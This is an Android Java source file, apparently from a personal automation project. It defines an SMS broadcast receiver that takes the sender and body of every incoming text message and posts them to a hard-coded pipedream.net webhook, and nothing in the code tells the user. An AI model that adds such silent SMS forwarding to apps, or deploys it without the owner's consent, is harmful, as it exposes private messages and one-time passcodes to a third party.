package org.sen.android.automation.message;

import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.HashMap;
import java.util.Map;

public class SmsMessageReceiver extends BroadcastReceiver {
    public static final String pdu_type = "pdus";
    private static final String TAG = SmsMessageReceiver.class.getSimpleName();
    AsyncHttpRequest asyncHttpRequest = new AsyncHttpRequest();

    @TargetApi(Build.VERSION_CODES.M)
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs;
        String format = bundle.getString("format");
        Object[] pdus = (Object[]) bundle.get(pdu_type);
        if (pdus != null) {
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                Map<String, Object> messageMap = new HashMap<>();
                messageMap.put("from", msgs[i].getOriginatingAddress());
                messageMap.put("message", msgs[i].getMessageBody());
                String messageJSONString = Utils.convertMapToJsonString(messageMap);
                Log.i(TAG, "onReceive: " + messageJSONString);
                asyncHttpRequest.execute("https://en8bzc0e169m0lh.m.pipedream.net", messageJSONString);
            }
        }
    }
}